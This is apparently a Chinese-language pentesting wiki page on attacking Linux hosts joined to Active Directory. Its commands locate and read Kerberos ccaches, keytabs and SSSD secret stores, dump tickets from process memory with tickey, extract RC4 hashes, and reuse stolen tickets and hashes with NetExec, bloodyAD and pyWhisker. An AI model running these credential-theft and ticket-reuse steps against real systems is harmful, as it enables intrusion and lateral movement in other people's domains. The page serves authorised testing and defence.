# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux 机器也可能处于 Active Directory 环境中。

AD 环境中的 Linux 机器可以**在本地存储 Kerberos 凭据材料**：用户 ccache、机器/服务 keytab，以及由 SSSD 管理的机密。这些工件通常可以像其他 Kerberos 凭据一样重复使用。要读取其中大多数内容，你需要是票据所属用户，或成为该机器上的 **root**。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## 枚举

### 从 linux 枚举 AD

如果你可以通过 Linux（或 Windows 中的 bash）访问 AD，可以尝试使用 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) 枚举 AD。

你也可以查看以下页面，了解**从 linux 枚举 AD 的其他方法**：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA 是 Microsoft Windows **Active Directory** 的开源**替代方案**，主要面向 **Unix** 环境。它将完整的 **LDAP 目录**与 MIT **Kerberos** 密钥分发中心（KDC）结合起来，提供类似 Active Directory 的管理功能。它使用 Dogtag **Certificate System** 管理 CA 和 RA 证书，并支持包括智能卡在内的**多因素**身份验证。SSSD 集成用于 Unix 身份验证流程。<sup>[[14]](#references)[[15]](#references)</sup> 在以下页面了解更多信息：


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### 加入域的主机工件

在处理票据之前，先确认**主机是如何加入 AD 的**，以及 **Kerberos 凭据材料实际存储在哪里**。在现代 Linux 主机上，这通常由 `realmd` + `adcli` + `sssd` 负责，而不只是存放在 `/tmp` 中的普通文件。<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

这可以快速告诉你该主机是否信任 AD、SSSD 是否在缓存身份或票据，以及是否存在可被滥用的 **machine/service keytabs** 或 **KCM secrets**。<sup>[[4]](#references)[[10]](#references)</sup>

请将 `/var/lib/sss/db/cache_*.ldb` 与 Kerberos ccaches 及 `/var/lib/sss/secrets/secrets.ldb` 分开检查。当域配置了 `cache_credentials = true` **且**用户此前曾在该主机上进行身份验证时，`cache_*.ldb` 文件可能包含离线密码验证器。这些文件通常只有特权用户才能读取。仅凭缓存文件或已启用的设置，无法证明存在可用且当前有效的密码；得出结论前，应检查每个域的有效设置和实际缓存的身份。参见 [Red Hat 的 SSSD 凭据缓存文档](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication)。对于单独的 Linux 到 AD 身份边界，[不同厂商 Kerberos 的名称映射](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/)仅在服务接受该票据并将其主体映射到相关 Unix 账户时才有影响。

在安装了 `ksu` 的主机上，只有当目标账户授权了该主体时，有效的 Kerberos 主体才能访问**本地目标账户**，包括 root。[MIT Kerberos 文档](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html)介绍了目标主目录中的 `.k5login` 和 `.k5users` 文件，以及两者均不存在时的名称映射回退机制。`.k5users` 还可以限制 `ksu -e` 可执行的命令；仅凭文件名无法证明可以访问 shell。请检查确切的目标账户、文件所有权/权限、可读的授权条目、可用的 Kerberos 凭据以及有效的映射规则。若无法访问 root 主目录，则授权状态仍属未知。被动枚举应列出这些路径和权限，不要请求票据或运行 `ksu`。

计划任务中的备份可能间接创建 `.k5login` 授权边界。如果权限更高的账户将较低权限用户可写的目录递归复制到自己的主目录中，请确认复制操作包含隐藏文件、目标路径是该账户实际使用的主目录，并且生成文件的所有权符合 Kerberos 登录服务的要求。例如，[rsync 文档](https://download.samba.org/pub/rsync/rsync.1.html)说明，`-a --no-owner` 会使新建的目标文件归接收用户所有。[MIT Kerberos 文档](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html)介绍了该用户 `.k5login` 中的主体如何授权访问。请确认计划任务的 RunAs 身份、源目录写入权限、实际生效的 rsync 选项、启用了 GSSAPI 的登录，以及所列主体对应的有效票据；仅凭源目录可写或存在计划执行的 rsync 命令，无法证明这条利用路径成立。

可读取的 keytab 也需要按主体逐一检查。包含名称类似管理员的主体的 keytab，本身并不能证明拥有管理权限：[KDC 的 `kadm5.acl` 策略](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html)决定允许主体执行哪些操作。在将 keytab 访问视为通往 root 的路径之前，请分别确认主体、有效 ACL，以及本地 `ksu` 或登录授权。被动检查可以列出 keytab 路径和权限，但不要使用其中的密钥或联系 KDC。

## 玩转票据

### Pass The Ticket

本页将介绍在 Linux 主机中**查找 Kerberos 票据**的不同位置；下一页将介绍如何将这些 CCache 票据格式转换为 Kirbi（Windows 中需要使用的格式），以及如何执行 PTT 攻击：

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

如果你想了解 **Linux 专属的票据收集流程**（`FILE`、`DIR`、`KEYRING`、`KCM`、`/proc` 等），请参阅专门页面：

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### 从 /tmp 重用 CCACHE 票据

CCACHE 文件是用于**存储 Kerberos 凭据**的二进制格式。`FILE:/tmp/krb5cc_%{uid}` 仍很常见，但现代 Linux 部署也会使用 `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}` 或 `KCM:%{uid}`。在假设票据位于 `/tmp` 之前，请检查 **`KRB5CCNAME`** 环境变量和 `default_ccache_name` 设置。<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### 从 keyring 重用 CCACHE 票据

**进程内存中存储的 Kerberos 票据可以被提取**，尤其是在机器的 ptrace 保护被禁用时（`/proc/sys/kernel/yama/ptrace_scope`）。可用于此目的的工具是 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)，它可以通过注入会话来提取票据，并将其转储到 `/tmp`。<sup>[[1]](#references)[[16]](#references)</sup>

配置和使用此工具的步骤如下：

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

此过程会尝试注入各种会话，并通过将提取出的票据以 `__krb_UID.ccache` 的命名格式存储在 `/tmp` 中来表示成功。<sup>[[1]](#references)</sup>

### 从 SSSD KCM 重用 CCACHE 票据

SSSD 会在路径 `/var/lib/sss/secrets/secrets.ldb` 处维护数据库副本。对应的密钥存储在路径 `/var/lib/sss/secrets/.secrets.mkey` 处的隐藏文件中。默认情况下，只有拥有 **root** 权限才能读取该密钥。<sup>[[4]](#references)</sup>

使用 --database 和 --key 参数调用 **`SSSDKCMExtractor`**，即可解析数据库并**解密机密信息**。<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Extractor 会输出原始 Kerberos JSON payload；在执行 pass-the-cache/pass-the-ticket 操作前，将其转换为可用的 ticket cache 或其他 ticket 格式。<sup>[[4]](#references)</sup>

### keytab 快速初筛

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### 从 /etc/krb5.keytab 提取账户

服务账户密钥对于以 root 权限运行的服务至关重要，并安全地存储在 **`/etc/krb5.keytab`** 文件中。这些密钥相当于服务的密码，必须严格保密。<sup>[[5]](#references)</sup>

可以使用 **`klist`** 检查 keytab 文件的内容。在 Linux 上，`klist -k -K -e` 会输出主体、密钥版本号、加密类型和原始密钥材料。如果密钥类型为 **23 / RC4-HMAC**，该密钥值同时也是该主体的 **NT hash**。<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

对于 Linux 用户，**`KeyTabExtract`** 提供提取 RC4 HMAC hash 的功能，可用于复用 NTLM hash。请注意，只有当 keytab 中仍包含 **etype 23 / RC4-HMAC** 材料时，这种方法才有用。在仅使用 **AES** 的环境中，你可能无法获得可复用的 NT hash，但仍可通过 keytab 直接使用 Kerberos 进行身份验证。<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

在 macOS 上，**`bifrost`** 可用于分析 keytab 文件。<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

利用提取的账户和哈希信息，可以使用 **`NetExec`** 等工具与服务器建立连接。<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### 复用 `/etc/krb5.keytab` 中的机器帐户

在加入了 `realmd`/`adcli`/`sssd` 的系统上，`/etc/krb5.keytab` 通常包含**计算机帐户**以及一个或多个**主机/服务 principal**。如果你拥有 **root** 权限，不要直接转储它：使用 `klist -k` 列出的某个 principal 请求 TGT，并以 Linux 主机自身的身份进行操作。<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

当 **computer object** 本身在 AD 中拥有委派权限，或者该主机获准检索其他机密（例如 **gMSA**）时，这尤其有用。<sup>[[13]](#references)</sup>

### 使用 Linux 优先的 AD 工具重用窃取的 Kerberos 凭据

获得有效的 `ccache` 或可用的 keytab 后，你可以**直接从 Linux**对 AD 执行操作，无需先将所有内容转换为 Windows 格式。许多现代工具原生支持 `KRB5CCNAME` / Kerberos 身份验证。<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

这是 **Linux post-exploitation** 与 **AD object abuse** 之间很好的衔接。有关对象级滥用路径本身，请查看：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account 痕迹

较新的 Linux 部署可以直接从 AD 使用 **Managed Service Accounts**。实际上，这意味着在攻陷 Linux 服务器后，你可能会发现的不只有主机 keytab，还有从 gMSA 生成的**特定服务 keytab**。常见的检查位置包括 `/etc/gmsad.conf`、部署专用配置文件，以及 `/etc` 下其他 `*.keytab` 文件。<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

这会为绑定到该 gMSA 的 SPN 提供可重复使用的 Kerberos 身份，**无需接触任何 Windows 终端**。<sup>[[13]](#references)</sup> 有关在 AD 中获得更高权限后进行**域端** gMSA/dMSA 滥用，请参阅：

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos（II）：如何攻击 Kerberos？](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [使用托管服务帐户访问 AD – 将 RHEL 系统直接集成到 Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos 环境变量 – MIT Kerberos 文档](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos 文档](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757：Microsoft Windows 使用的 RC4-HMAC Kerberos 加密类型](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [使用 Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [发现并加入身份域 | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD 用户指南](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [关于 | FreeIPA 文档](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 发行说明](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Linux 内核文档](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos 文档](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
